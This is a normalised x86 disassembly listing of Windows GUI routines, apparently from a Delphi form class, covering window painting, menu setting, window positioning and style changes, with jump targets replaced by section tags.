push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44790c
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_459aac
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_460ef4
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424234
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_460841
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_460824
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_424ba0
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_424a40
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_45b198
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46082b
xor edx edx
mov eax [ ebp - 0xc ]
call sub_424ba0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_459aac
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_460ef4
call sub_44d054
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_46096f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424234
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_460948
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46092b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_424ba0
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_424a40
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460932
xor edx edx
mov eax [ ebp - 0xc ]
call sub_424ba0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_44d054
mov esi eax
sub_46094f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ReleaseDC
retn
sub_460a00
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_460a4c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_460f28
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_460f74
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_460a8c
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_460c5a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424118
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44ad08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4462a8
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4450a0
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_460a00
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424118
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_460f28
test eax eax
je r-xdata
push ebp
call sub_460a00
pop ecx
push ebp
call sub_460a00
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_460a4c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_45dc74
jmp r-xdata
sub_460c6c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_45ee3c
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_460cd8
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_45f4d8
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax ebx
call sub_420e90
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_44d054
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_449e78
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_44d054
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_420e64
call sub_45a5f0
mov edx esi
mov eax ebx
call sub_420e64
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
sub_460d70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_460ded
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_460df8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44a5f4
sub_460e24
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_44a5f4
xor edx edx
jmp r-xdata
mov eax esi
call sub_45efb8
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_460e5c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_445f68
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_44a5f4
sub_460ea0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_446074
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_460ef4
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_443644
sub_460f28
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_464a98
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_464a84
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_460f74
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_464a98
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_464a84
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_460fc4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_4183f4
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_460ff4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_44d054
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_464a68
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_464a68
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_460fc4
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_464a68
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_464a54
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_418550
call sub_403270
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_464a54
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_464a54
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_464a54
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_4610f8
push ebx
mov ebx eax
mov eax ebx
call sub_4610f0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_428cc4
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_461120
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_44a5ac
mov dl 0x1
mov eax esi
call sub_461484
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_461500
mov edx eax
mov eax esi
call sub_446904
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_44a748
mov dl 0x1
mov eax esi
call sub_4604a4
sub_4611a0
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_44d054
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_456bec
mov edi eax
mov eax ebp
call sub_44d054
push eax
call DrawMenuBar
sub_46121c
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_42093c
xor edx edx
mov eax ebx
call sub_458584
sub_461240
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_4611a0
mov eax edx
mov edx ebx
call sub_42093c
sub_461268
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46142e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_464a98
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_45a138
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_464a84
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_42093c
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_464a84
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
mov eax ebx
call sub_44d358
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_44d054
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_4611a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461435
lea eax [ ebp - 0x10 ]
call sub_403fe8
retn
mov dl 0x1
mov eax ebx
call sub_46232c
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_44d054
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_44d054
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_44d054
mov edx eax
mov eax esi
call sub_45a138
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_44d054
push eax
call SetMenu
sub_461450
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46143c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_4614ac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4614a0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_461518
push ebx
mov ebx eax
mov eax ebx
call sub_44c66c
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_461500
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_461500
mov edx eax
mov eax ebx
call sub_446904
mov edx 0xff00000f
mov eax ebx
call sub_446904
pop ebx
retn
sub_46159c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_44d054
push eax
call ShowWindow
sub_4615dc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_460ff4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_460ff4
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_464a68
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_464a54
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_460ff4
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_464a54
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_464a68
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_464a54
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464758
push eax
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_46473c
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464724
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_464a54
call sub_464724
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464724
push eax
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464770
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464758
push eax
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_46473c
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464724
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464770
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464758
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_464a54
call sub_464758
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464758
push eax
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_46473c
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464724
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464770
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464724
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464770
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_464758
push eax
mov edx esi
mov eax [ rw-data ]
call sub_464a54
call sub_46473c
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_461930
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_45edec
mov edx esi
mov eax edi
call sub_4642d4
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_4619df ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
